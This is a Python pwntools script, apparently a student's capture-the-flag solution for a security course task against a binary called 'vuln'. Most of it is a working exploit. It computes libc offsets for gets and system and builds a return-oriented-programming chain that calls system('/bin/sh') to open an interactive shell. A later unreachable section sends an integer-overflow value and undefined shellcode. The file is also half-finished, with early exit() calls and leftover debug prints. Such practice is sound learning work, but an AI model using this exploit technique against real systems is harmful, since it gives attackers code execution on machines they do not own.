#!/usr/bin/env python3

import pwn

pwn.context.arch = 'amd64'
#conn = pwn.remote('tasks.ws24.softsec.rub.de', 33233)
#conn = pwn.remote('127.0.0.1', 1024)

# use the provided lib c
conn = pwn.process('./vuln')
pwn.gdb.attach(conn)

# fixed as no ASLR in binray (got offset via IDA)
adress_got_gets = 0x000000000041BFB8

libz = pwn.ELF('./vuln')
# use my libc for local testing, switch to provided one for server
libc = pwn.ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = pwn.ELF('./libc.so.6')
offset_gets = libc.symbols['gets']
print(hex(offset_gets))
offset_system = libc.symbols['system']
print(hex(offset_system))
# address_system = address_gets - offset_gets + offset_system
offset = offset_gets - offset_system
print(hex(offset))


offset_to_shell_string = next(libc.search(b'/bin/sh\x00'))
print(hex(offset_to_shell_string))
exit()

address_sh_string = 0x7fff05ec9a60
address_g1 = 0x0000000000403f62 # pop rdx; ret;
address_g2 = 0x000000000040a8ee # pop rax; ret;
address_g3 = 0x0000000000410c70 # mov rax, qword ptr [rdx + rax*8]; ret; 
address_g4 = 0x0000000000403f62 # pop rdx; ret;v
address_g5 = 0x0000000000411937 # sub rax, rdx; ret;
address_g6 = 0x0000000000401465 # pop rdi; ret;
address_g7 = 0x0000000000401010 # call rax;


rop_chain = b'\\bin\\sh\x00' + b'A' * 16 + pwn.p64(address_g1) + pwn.p64(adress_got_gets) + pwn.p64(address_g2) + pwn.p64(0x0) + pwn.p64(address_g3) + pwn.p64(address_g4) + pwn.p64(offset) + pwn.p64(address_g5) + pwn.p64(address_g6) + pwn.p64(address_sh_string) + pwn.p64(address_g7)

print(rop_chain.hex())


conn.sendline(rop_chain)
conn.interactive()
exit()















#0x4c490
print(hex(offset_system))
exit()
#0x76040
print(hex(offset_gets))
exit()

print(libz.arch)

# first argument in rdi (fd), 2nd argument in rsi (flags)
offset_open = libz.symbols['open']
print(hex(offset_open))
offset_write = libz.symbols['write']
print(hex(offset_write))


# print(next(libz.search(pwn.p16(0x0F05))))

#print(next(libz.search(b'syscall')))

#offset_to_shell_string = next(libc.search(b'/bin/sh\x00'))
#offset_to_system_function = libc.symbols['system']

#print(f'libc function system() is at offset {hex(offset_to_system)}')



conn.recvuntil(b'Nappa: Hey Vegeta, how many digits can your new scouter display?\n')
conn.sendline("-2147483648".encode())
conn.recvuntil("Vegeta: Let's see what Kakarot's power level is with this new scouter.\n")
conn.send(shellcode)
conn.interactive()
